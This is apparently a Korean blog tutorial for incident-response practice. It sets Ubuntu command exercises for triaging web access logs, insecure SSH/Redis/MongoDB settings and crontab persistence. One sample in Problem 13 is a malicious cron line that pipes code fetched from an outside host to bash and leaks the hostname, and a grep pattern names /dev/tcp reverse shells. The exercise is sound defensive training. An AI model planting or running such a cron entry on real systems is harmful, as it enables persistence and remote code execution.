# 보안 로그 분석 심화 - 실제 상황형 Ubuntu 명령어 20문제

이 자료는 [2026-04-10-Linux-7-1.md](C:\work\Obsidian\sbaek100.github.io\_posts\2026-04-10-Linux-7-1.md)에서 만든 `~/security2` 실습 환경을 그대로 사용한다.

이번에는 단순히 파일 하나를 보는 수준을 넘어서, 여러 로그와 설정 파일을 연결해서 판단하는 연습을 한다. 실제 보안 관제나 사고 대응에서 자주 하는 작업에 가깝게 문제를 구성했다.

---

## 상황

새벽 시간대에 웹 서버에서 이상 행위가 보고되었다.
운영팀은 서버 자체를 아직 내릴 수 없어서, 보안팀이 먼저 증적을 읽기 전용으로 분석해야 한다.

선임이 여러분에게 아래와 같이 지시했다.

1. 어떤 IP가 가장 수상한지 빠르게 추려라.
2. 로그인 공격, 경로 조작, SQL 인젝션, 정보 수집 흔적을 나눠서 보라.
3. 설정 파일 중 실제 운영에 치명적인 항목을 묶어서 점검하라.
4. 지속성 확보 흔적과 외부 유출 흔적을 찾아라.
5. 마지막에 분석 결과를 보관할 수 있게 압축까지 준비하라.

> 전제
>
> 아래 문제는 `Linux-7-1`의 사전 실습을 끝내서 `~/security2` 폴더가 이미 만들어진 상태를 기준으로 한다.

## 문제 1

접근 로그에서 가장 많이 등장한 IP 상위 목록을 보고 싶다. IP별 요청 수를 많은 순서대로 정렬하는 명령은 무엇인가?

### 실습

접근 로그를 IP 기준으로 집계하라.

### 예상 화면

```bash
4 45.33.22.11
4 8.8.8.8
3 123.45.67.89
```

### 답

```bash
awk '{print $1}' ~/security2/logs/access.log | sort | uniq -c | sort -nr
```

## 문제 2

로그인 실패만 따로 보려고 한다. `POST /login.php` 이면서 상태코드가 `401` 인 줄만 찾는 명령은 무엇인가?

### 실습

실패 로그인 요청만 추려라.

### 예상 화면

```bash
8.8.8.8 - - [26/Mar/2025:08:26:50 +0900] "POST /login.php HTTP/1.1" 401 789
```

### 답

```bash
grep 'POST /login.php' ~/security2/logs/access.log | grep ' 401 '
```

## 문제 6

정보 수집 단계에서 자주 보이는 민감 파일 스캔 요청만 한 번에 보고 싶다. `.env`, `.git/config`, `wp-login.php`, `phpinfo.php` 중 하나라도 포함된 줄을 찾는 명령은 무엇인가?

### 실습

정보 수집 흔적을 한 번에 추려라.

### 예상 화면

```bash
grep -E '\.env|\.git/config|wp-login\.php|phpinfo\.php' ~/security2/logs/access.log
```

## 문제 11

SSH 설정, Redis 설정, MongoDB 설정 중 인증 또는 접근 제어가 약한 항목만 한 번에 보고 싶다. 세 파일에서 `yes`, `0.0.0.0`, `disabled`, `requirepass` 관련 줄을 함께 찾는 명령은 무엇인가?

### 실습

주요 취약 설정만 한 번에 추려라.

### 예상 화면

```bash
... PermitRootLogin yes
... PasswordAuthentication yes
... bind 0.0.0.0
... requirepass ""
... authorization: "disabled"
```

### 답

```bash
grep -E 'PermitRootLogin yes|PasswordAuthentication yes|0.0.0.0|requirepass|authorization: "disabled"' \
~/security2/config/sshd_config ~/security2/config/redis.conf ~/security2/config/mongod.conf
```

## 문제 13

크론탭에서 정상 백업 작업과 수상한 작업을 구분하려고 한다. 먼저 외부 URL 호출이나 역방향 셸과 관련된 줄만 찾는 명령은 무엇인가?

### 실습

수상한 크론 작업만 추려라.

### 예상 화면

```bash
*/30 * * * * curl -s http://update.example-cdn.com/check.php?h=$(hostname) | bash

```

### 답

```bash
grep -E 'curl|/dev/tcp|@reboot /tmp/update_service' ~/security2/system/crontab.txt
```

## 마무리 체크

이번 7-2에서 익혀야 할 핵심은 아래와 같다.

- 단일 파일 조회보다 `grep`, `awk`, `sort`, `uniq`, `tr` 를 연결해 의미 있는 결과를 뽑아내기
- 단순 조회가 아니라 공격 유형별로 로그를 분류하기
- 여러 설정 파일에서 공통된 위험 패턴을 한 번에 확인하기
- 지속성 확보, 정보 수집, 인증 실패, SQL 인젝션 흔적을 구분하기
- 분석 사본을 따로 만들고 압축해 보관하기

## 추가 도전

여기까지 끝났다면 아래도 해 보자.

1. `45.33.22.11` 과 `123.45.67.89` 중 누가 더 위험한지 근거를 3줄로 정리하기
2. `grep -R 'password' ~/security2` 로 민감 정보가 있는 파일 범위 넓혀 보기
3. `find ~/security2 -type f | wc -l` 로 전체 증적 파일 수 세기
4. `tar -tzvf ~/incident-pack.tar.gz` 로 압축 파일 내부 목록 검증하기
